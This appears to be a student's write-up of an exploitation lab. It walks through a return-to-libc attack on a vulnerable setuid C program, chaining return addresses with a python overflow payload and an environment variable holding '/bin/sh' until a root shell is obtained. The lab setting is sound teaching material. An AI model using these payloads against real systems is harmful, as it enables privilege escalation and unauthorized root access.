<h1 id="advanced-exploits-taunt-lab">Advanced Exploits Taunt Lab</h1>

<ul>
<li>Return-to-libc </li>
<li>Format String attack</li>
<li>Heap Overflow</li>
<li>ROP</li>
</ul>

<p>This lab includes some advanced exploits skills. The non-executable bit for writable segments (NX) has now been enabled for some of your targets. You will no longer be able to jump to shellcode on the stack. </p>



<h2 id="return-to-libc">Return-to-libc</h2>

<p>The code below is a vulnerable program  <strong>durka.c</strong> with some system call we can use. _</p>



<pre class="prettyprint"><code class="language-C hljs cpp">
<span class="hljs-comment">/* Belongs to user*/</span>

<span class="hljs-preprocessor">#include &lt;stdio.h&gt;</span>
<span class="hljs-preprocessor">#include &lt;stdlib.h&gt;</span>
<span class="hljs-preprocessor">#include &lt;string.h&gt;</span>
<span class="hljs-preprocessor">#include &lt;sys/types.h&gt;</span>
<span class="hljs-preprocessor">#define _GNU_SOURCE</span>
<span class="hljs-preprocessor">#include &lt;unistd.h&gt;</span>

<span class="hljs-keyword">void</span> f(<span class="hljs-keyword">char</span> *s)
{
        <span class="hljs-keyword">char</span> buf[<span class="hljs-number">260</span>];
        <span class="hljs-built_in">strcpy</span>(buf, s);
}

<span class="hljs-keyword">void</span> agonistic_heaven(<span class="hljs-keyword">void</span>)
{
        <span class="hljs-keyword">static</span> uid_t uid;
        uid = geteuid();
        setresuid (uid, uid, uid);
}

<span class="hljs-keyword">void</span> flugeldufel(<span class="hljs-keyword">void</span>)
{
        system(<span class="hljs-string">"/usr/bin/fortune"</span>); <span class="hljs-comment">/* Oh no! */</span>
        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);
}

<span class="hljs-keyword">int</span> main(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])
{
        <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>)
                <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);

        uid_t uid = getuid();
        uid_t euid = geteuid();

<span class="hljs-built_in">printf</span>(<span class="hljs-string">"running as uid = %u, euid = %u\n"</span>, uid, euid);

        f(argv[<span class="hljs-number">1</span>]);

        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
}
</code></pre>

<p>The program generously sets up the euid and id for us, and does a system call <code>system("/usr/bin/fortune")</code> which we can use. Moreover, notice this time, the environment variable is not flushed out (Hooray!) meaning we can inject some useful string to the environment variable table. So let’s get started.  <br>
To begin, notice that only <code>f()</code> is explicitly called in <code>main()</code>, and <code>buf[260]</code> is reserved. Recall the next 4 bytes after <code>buf</code> will be <code>$ebp</code> and the next 4 byte will be the return address, which we want to manipulate. And after the return address is popped from stack, the next 4 byte will be the new return address. So we can first try to chain up the return address to get us inside the <code>agonistic_heaven()</code>function.  <br>
The technique is as introduced before.  <br>
<code>user@host:/your-dir$ objdump -d durka</code></p>



<pre class="prettyprint"><code class=" hljs perl">0804859<span class="hljs-number">0</span> &lt;agonistic_heaven&gt;:
 <span class="hljs-number">8048590</span>:       <span class="hljs-number">55</span>                      <span class="hljs-keyword">push</span>   <span class="hljs-variable">%ebp</span>
 <span class="hljs-number">8048591</span>:       <span class="hljs-number">89</span> e5                   mov    <span class="hljs-variable">%esp</span>,<span class="hljs-variable">%ebp</span>
 <span class="hljs-number">8048593</span>:       e8 <span class="hljs-number">48</span> fe ff ff          call   <span class="hljs-number">80483</span>e<span class="hljs-number">0</span> &lt;geteuid<span class="hljs-variable">@plt</span>&gt;
 <span class="hljs-number">8048598</span>:       <span class="hljs-number">50</span>                      <span class="hljs-keyword">push</span>   <span class="hljs-variable">%eax</span>
 <span class="hljs-number">8048599</span>:       <span class="hljs-number">50</span>                      <span class="hljs-keyword">push</span>   <span class="hljs-variable">%eax</span>
 <span class="hljs-number">804859</span>a:       <span class="hljs-number">50</span>                      <span class="hljs-keyword">push</span>   <span class="hljs-variable">%eax</span>
...
080485b<span class="hljs-number">0</span> &lt;flugeldufel&gt;:
 <span class="hljs-number">80485</span>b<span class="hljs-number">0</span>:       <span class="hljs-number">55</span>                      <span class="hljs-keyword">push</span>   <span class="hljs-variable">%ebp</span>
 <span class="hljs-number">80485</span>b1:       <span class="hljs-number">89</span> e5                   mov    <span class="hljs-variable">%esp</span>,<span class="hljs-variable">%ebp</span>
 <span class="hljs-number">80485</span>b3:       <span class="hljs-number">68</span> <span class="hljs-number">50</span> <span class="hljs-number">86</span> <span class="hljs-number">04</span> 08          <span class="hljs-keyword">push</span>   <span class="hljs-variable">$0</span>x804865<span class="hljs-number">0</span>
 <span class="hljs-number">80485</span>b8:       e8 <span class="hljs-number">43</span> fe ff ff          call   <span class="hljs-number">8048400</span> &lt;<span class="hljs-keyword">system</span><span class="hljs-variable">@plt</span>&gt;
 <span class="hljs-number">80485</span>bd:       <span class="hljs-number">6</span>a <span class="hljs-number">00</span>                   <span class="hljs-keyword">push</span>   <span class="hljs-variable">$0</span><span class="hljs-keyword">x</span><span class="hljs-number">0</span>
 <span class="hljs-number">80485</span>bf:       e8 <span class="hljs-number">4</span>c fe ff ff          call   <span class="hljs-number">8048410</span> &lt;<span class="hljs-keyword">exit</span><span class="hljs-variable">@plt</span>&gt;
 <span class="hljs-number">80485</span>c4:       <span class="hljs-number">66</span> <span class="hljs-number">90</span>                   xchg   <span class="hljs-variable">%ax</span>,<span class="hljs-variable">%ax</span>
</code></pre>

<p>Let’s write down the several interesting addresses first. <br>
<code>agonistic_heaven : 0x08048590</code> <br>
<code>flugeldufel      : 0x080485b0</code> <br>
<code>call   8048400 &lt;system@plt&gt;: 0x80485b8</code></p>

<p>You may wonder why we don’t want to use the address of the system call <code>system@plt</code> itself. The reason is that <code>bash</code> will ignore any <code>null</code> bytes as argument, so the <code>00</code> byte in address <code>0x08048400</code> will be ignored, and that is a real pain in the ass.</p>

<p>So chain up the return addresses like this: <br>
<code>$(python -c 'print "A"*264+"\x90\x85\x04\x08\xb8\x85\x04\x08"')</code> <br>
And let’s try run this input inside <code>gdb</code> and examine the stack at each function.  <br>
Open up your <code>gdb</code> debugger with <strong>durka</strong>. <br>
<code>user@host:/your-dir$ gdb durka</code> <br>
Don’t forget to clear out the <code>LINES</code> and <code>COLUMNS</code> environment variables, or otherwise your exploit may not work outside the <code>gdb</code>.</p>



<pre class="prettyprint"><code class=" hljs mel">(gdb) unset <span class="hljs-keyword">env</span> LINES
(gdb) unset <span class="hljs-keyword">env</span> COLUMNS
(gdb) show <span class="hljs-keyword">env</span></code></pre>

<p>Set up several break points so we can examine the stack.</p>



<pre class="prettyprint"><code class="language-gdb hljs livecodeserver"> (gdb) b f
Breakpoint <span class="hljs-number">1</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0x8048570</span>: <span class="hljs-built_in">file</span> durka.c, <span class="hljs-built_in">line</span> <span class="hljs-number">11.</span>
(gdb) b agonistic_heaven
Breakpoint <span class="hljs-number">2</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0x8048590</span>: <span class="hljs-built_in">file</span> durka.c, <span class="hljs-built_in">line</span> <span class="hljs-number">17.</span>
(gdb) b flugeldufel
Breakpoint <span class="hljs-number">3</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0x80485b0</span>: <span class="hljs-built_in">file</span> durka.c, <span class="hljs-built_in">line</span> <span class="hljs-number">24.</span></code></pre>

<p>run the program with the designed input:</p>



<pre class="prettyprint"><code class="language-gdb hljs tex">run <span class="hljs-formula">$(python -c 'print "A"*264+"<span class="hljs-command">\x</span>90<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xb</span>8<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08"')
Starting program: /c0re/durka $</span>(python -c 'print "A"*264+"<span class="hljs-command">\x</span>90<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xb</span>8<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08"')
running as uid = 1030, euid = 1030

Breakpoint 1, f (s=0xffffdb5d 'A' &lt;repeats 200 times&gt;...) at durka.c:11
(gdb) cont
Continuing.

Breakpoint 2, agonistic_heaven () at durka.c:17</code></pre>

<p>Emm, indeed we step in to <code>agnostic_heaven()</code> not bad. Let’s examine what the stack look like after the function finished.</p>



<pre class="prettyprint"><code class=" hljs perl">(gdb) disas
Dump of assembler code <span class="hljs-keyword">for</span> function agonistic_heaven:
=&gt; <span class="hljs-number">0x08048590</span> &lt;+<span class="hljs-number">0</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-variable">%ebp</span>
   <span class="hljs-number">0x08048591</span> &lt;+<span class="hljs-number">1</span>&gt;:     mov    <span class="hljs-variable">%esp</span>,<span class="hljs-variable">%ebp</span>
   <span class="hljs-number">0x08048593</span> &lt;+<span class="hljs-number">3</span>&gt;:     call   <span class="hljs-number">0x80483e0</span> &lt;geteuid<span class="hljs-variable">@plt</span>&gt;
   <span class="hljs-number">0x08048598</span> &lt;+<span class="hljs-number">8</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-variable">%eax</span>
   <span class="hljs-number">0x08048599</span> &lt;+<span class="hljs-number">9</span>&gt;:     <span class="hljs-keyword">push</span>   <span class="hljs-variable">%eax</span>
   <span class="hljs-number">0x0804859a</span> &lt;+<span class="hljs-number">10</span>&gt;:    <span class="hljs-keyword">push</span>   <span class="hljs-variable">%eax</span>
   <span class="hljs-number">0x0804859b</span> &lt;+<span class="hljs-number">11</span>&gt;:    call   <span class="hljs-number">0x80483b0</span> &lt;setresuid<span class="hljs-variable">@plt</span>&gt;
   <span class="hljs-number">0x080485a0</span> &lt;+<span class="hljs-number">16</span>&gt;:    add    <span class="hljs-variable">$0</span>xc,<span class="hljs-variable">%esp</span>
   <span class="hljs-number">0x080485a3</span> &lt;+<span class="hljs-number">19</span>&gt;:    leave
   <span class="hljs-number">0x080485a4</span> &lt;+<span class="hljs-number">20</span>&gt;:    ret
End of assembler <span class="hljs-keyword">dump</span>.
(gdb) <span class="hljs-keyword">until</span> <span class="hljs-variable">*0x080485a3</span>
<span class="hljs-number">0x080485a3</span> in agonistic_heaven () at durka.c:<span class="hljs-number">21</span>
(gdb) <span class="hljs-keyword">x</span>/<span class="hljs-number">32</span><span class="hljs-keyword">x</span> <span class="hljs-variable">$ebp</span>
<span class="hljs-number">0xffffd960</span>:     <span class="hljs-number">0x41414141</span>      <span class="hljs-number">0x080485b8</span>      <span class="hljs-number">0x08048600</span>      <span class="hljs-number">0x00000406</span>
<span class="hljs-number">0xffffd970</span>:     <span class="hljs-number">0x00000406</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7e2a276</span>
<span class="hljs-number">0xffffd980</span>:     <span class="hljs-number">0x00000002</span>      <span class="hljs-number">0xffffda14</span>      <span class="hljs-number">0xffffda20</span>      <span class="hljs-number">0x00000000</span>
<span class="hljs-number">0xffffd990</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7fc5000</span>      <span class="hljs-number">0xf7ffdc0c</span>
<span class="hljs-number">0xffffd9a0</span>:     <span class="hljs-number">0xf7ffd000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000002</span>      <span class="hljs-number">0xf7fc5000</span>
<span class="hljs-number">0xffffd9b0</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x05846f03</span>      <span class="hljs-number">0x3f730313</span>      <span class="hljs-number">0x00000000</span>
<span class="hljs-number">0xffffd9c0</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0x00000002</span>      <span class="hljs-number">0x0804847b</span>
<span class="hljs-number">0xffffd9d0</span>:     <span class="hljs-number">0x00000000</span>      <span class="hljs-number">0xf7fee720</span>      <span class="hljs-number">0xf7e2a189</span>      <span class="hljs-number">0xf7ffd000</span>
</code></pre>

<p><code>0x080485b8</code> is the address where we will call <code>system@plt</code>, but with what parameter? Recall that the parameter is always pushed to the top of stack, which right now is the next four bytes after the call address <code>0x08048600</code>, it should be some random stuff, but let’s just check.</p>



<pre class="prettyprint"><code class=" hljs bash">(gdb) x/s <span class="hljs-number">0</span>x08048600
<span class="hljs-number">0</span>x8048600 &lt;__libc_csu_init+<span class="hljs-number">48</span>&gt;: <span class="hljs-string">"1\377\215\266"</span></code></pre>

<p>Indeed. <br>
What we really want to pass to the <code>system()</code> is no doubt <code>/bin/sh</code>, but where can we find it? Once we have the address of <code>/bin/sh</code> we can simply append it to our current exploit input to make it the parameter of <code>system()</code>. So let’s find a place for <code>/bin/sh</code>.  <br>
There are different ways to do so (I believe). I will focus on how to inject through environment variable. This is a useful technique not only here, but you can also inject your shellcode into the system variable, given the program disabled <code>ASRL</code> and didn’t flush the environ table.  <br>
Let’s first examine the existed environment variables. </p>



<pre class="prettyprint"><code class=" hljs makefile">user@host:/your-dir$ env
<span class="hljs-constant">_system_type</span>=Linux
<span class="hljs-constant">SSH_CONNECTION</span>=170.140.151.178 60648 172.18.1.11 22
<span class="hljs-constant">LANG</span>=en_US.UTF-8
<span class="hljs-constant">rvm_bin_path</span>=/usr/local/rvm/bin
<span class="hljs-constant">OLDPWD</span>=/
<span class="hljs-constant">rvm_version</span>=1.29.3 (latest)
<span class="hljs-constant">RUBY_VERSION</span>=ruby-2.4.1
<span class="hljs-constant">GEM_HOME</span>=/usr/local/rvm/gems/ruby-2.4.1
<span class="hljs-constant">USER</span>=user
<span class="hljs-constant">PWD</span>=/c0re
<span class="hljs-constant">_system_version</span>=9
<span class="hljs-constant">HOME</span>=/home/user
<span class="hljs-constant">_system_name</span>=Debian
<span class="hljs-constant">SSH_CLIENT</span>=170.140.151.178 60648 22
<span class="hljs-constant">_system_arch</span>=x86_64
<span class="hljs-constant">GEM_PATH</span>=/usr/local/rvm/gems/ruby-2.4.1:/usr/local/rvm/gems/ruby-2.4.1@global
<span class="hljs-constant">SSH_TTY</span>=/dev/pts/0
<span class="hljs-constant">rvm_path</span>=/usr/local/rvm
<span class="hljs-constant">MAIL</span>=/var/mail/user
<span class="hljs-constant">TERM</span>=xterm
<span class="hljs-constant">SHELL</span>=/bin/bash
<span class="hljs-constant">rvm_prefix</span>=/usr/local
<span class="hljs-constant">SHLVL</span>=1
<span class="hljs-constant">LOGNAME</span>=user
<span class="hljs-constant">MY_RUBY_HOME</span>=/usr/local/rvm/rubies/ruby-2.4.1
<span class="hljs-constant">PATH</span>=/usr/local/rvm/gems/ruby-2.4.1/bin:/usr/local/rvm/gems/ruby-2.4.1@global/bin:/usr/local/rvm/rubies/ruby-2.4.1/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin:/home/user/bin
<span class="hljs-constant">IRBRC</span>=/usr/local/rvm/rubies/ruby-2.4.1/.irbrc
<span class="hljs-constant">_</span>=/usr/bin/env</code></pre>

<p>Hmmm, <code>/bin/bash</code> looks interesting, but not exactly what we want cause it won’t give you the root privilege, we need to put out own <code>/bin/sh</code> there. <br>
The way to do it in <code>LINUX</code> command line is :</p>



<pre class="prettyprint"><code class=" hljs makefile">user@host:/your-dir$ export EVIL=/bin/sh
user@host:/your-dir$ env
<span class="hljs-constant">_system_type</span>=Linux
<span class="hljs-constant">SSH_CONNECTION</span>=170.140.151.178 60648 172.18.1.11 22
<span class="hljs-constant">LANG</span>=en_US.UTF-8
<span class="hljs-constant">rvm_bin_path</span>=/usr/local/rvm/bin
<span class="hljs-constant">OLDPWD</span>=/
<span class="hljs-constant">rvm_version</span>=1.29.3 (latest)
<span class="hljs-constant">RUBY_VERSION</span>=ruby-2.4.1
<span class="hljs-constant">GEM_HOME</span>=/usr/local/rvm/gems/ruby-2.4.1
<span class="hljs-constant">USER</span>=user
<span class="hljs-constant">PWD</span>=/c0re
<span class="hljs-constant">_system_version</span>=9
<span class="hljs-constant">HOME</span>=/home/user
<span class="hljs-constant">_system_name</span>=Debian
<span class="hljs-constant">SSH_CLIENT</span>=170.140.151.178 60648 22
<span class="hljs-constant">EVIL</span>=/bin/sh
<span class="hljs-constant">_system_arch</span>=x86_64
<span class="hljs-constant">GEM_PATH</span>=/usr/local/rvm/gems/ruby-2.4.1:/usr/local/rvm/gems/ruby-2.4.1@global
<span class="hljs-constant">SSH_TTY</span>=/dev/pts/0
<span class="hljs-constant">rvm_path</span>=/usr/local/rvm
<span class="hljs-constant">MAIL</span>=/var/mail/user
<span class="hljs-constant">TERM</span>=xterm
<span class="hljs-constant">SHELL</span>=/bin/bash
<span class="hljs-constant">rvm_prefix</span>=/usr/local
<span class="hljs-constant">SHLVL</span>=1
<span class="hljs-constant">LOGNAME</span>=user
<span class="hljs-constant">MY_RUBY_HOME</span>=/usr/local/rvm/rubies/ruby-2.4.1
<span class="hljs-constant">PATH</span>=/usr/local/rvm/gems/ruby-2.4.1/bin:/usr/local/rvm/gems/ruby-2.4.1@global/bin:/usr/local/rvm/rubies/ruby-2.4.1/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/local/rvm/bin:/home/user/bin
<span class="hljs-constant">IRBRC</span>=/usr/local/rvm/rubies/ruby-2.4.1/.irbrc
<span class="hljs-constant">_</span>=/usr/bin/env</code></pre>

<p>We now have an <code>EVIL</code> environment variable as <code>/bin/sh</code>. Yayyy! <br>
The next step will be trying to figure out where is this variable is stored. Of course this can be achieved in <code>gdb</code>. Remember that the environment variables are only loaded to the stack when the program is running. </p>



<pre class="prettyprint"><code class=" hljs lasso">(gdb) info <span class="hljs-built_in">variable</span> environ
<span class="hljs-literal">All</span> variables matching regular expression <span class="hljs-string">"environ"</span>:

Non<span class="hljs-attribute">-debugging</span> symbols:
<span class="hljs-number">0xf7fc6dbc</span>  __environ
<span class="hljs-number">0xf7fc6dbc</span>  _environ
<span class="hljs-number">0xf7fc6dbc</span>  environ
(gdb) x/s <span class="hljs-subst">**</span><span class="hljs-number">0xf7fc6dbc</span>
<span class="hljs-number">0xffffdc5c</span>:     <span class="hljs-string">"_system_type=Linux"</span>
(gdb) x/s <span class="hljs-subst">**</span><span class="hljs-number">0xf7fc6dbc</span><span class="hljs-subst">+</span><span class="hljs-number">1</span>
<span class="hljs-number">0xffffdc5d</span>:     <span class="hljs-string">"system_type=Linux"</span>
(gdb)
<span class="hljs-number">0xffffdc6f</span>:     <span class="hljs-string">"SSH_CONNECTION=170.140.151.178 60648 172.18.1.11 22"</span>
(gdb)
<span class="hljs-number">0xffffdca3</span>:     <span class="hljs-string">"_=/usr/bin/gdb"</span></code></pre>

<p>This is how you figure out the address of the whole environment table. Step through it ad figure out where is the <code>EVIL</code> variable stored.</p>



<pre class="prettyprint"><code class=" hljs bash">(gdb)
<span class="hljs-number">0</span>xffffddbc:     <span class="hljs-string">"EVIL=/bin/sh"</span>
(gdb) x/s <span class="hljs-number">0</span>xffffddc1
<span class="hljs-number">0</span>xffffddc1:     <span class="hljs-string">"/bin/sh"</span></code></pre>

<p>Perfect! Now we have an address for <code>/bin/sh</code>. Next let’s add this to the exploit string. And try it out inside <code>gdb</code> first</p>



<pre class="prettyprint"><code class=" hljs tex">(gdb) run <span class="hljs-formula">$(python -c 'print "A"*264+"<span class="hljs-command">\x</span>90<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xb</span>8<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xc</span>6<span class="hljs-command">\xdd</span><span class="hljs-command">\xff</span><span class="hljs-command">\xff</span>"')
Starting program: /c0re/attacklib1 $</span>(python -c 'print "A"*264+"<span class="hljs-command">\x</span>90<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xb</span>8<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xc</span>6<span class="hljs-command">\xdd</span><span class="hljs-command">\xff</span><span class="hljs-command">\xff</span>"')
running as uid = 1030, euid = 1030
<span class="hljs-formula">$</span></code></pre>

<p>Yes! We spawn a shell! <br>
Now let’s try it with the program itself. Note, there is another program with <code>euid=0</code> called <code>attacklib1</code> so you don’t have t worry about the discrepancy between your <code>uid</code> and <code>euid</code></p>



<pre class="prettyprint"><code class=" hljs tex">rwang74@4550866279a6:/c0re<span class="hljs-formula">$ /c0re/attacklib1 $</span>(python -c 'print "A"*264+"<span class="hljs-command">\x</span>90<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xb</span>8<span class="hljs-command">\x</span>85<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>08<span class="hljs-command">\xc</span>1<span class="hljs-command">\xdd</span><span class="hljs-command">\xff</span><span class="hljs-command">\xff</span>"')
running as uid = 1030, euid = 0 
<span class="hljs-special">#</span> whoami
<span class="hljs-special">#</span> root</code></pre>

<p>Yayyyyy! We exploited a program without inject shellcode!</p>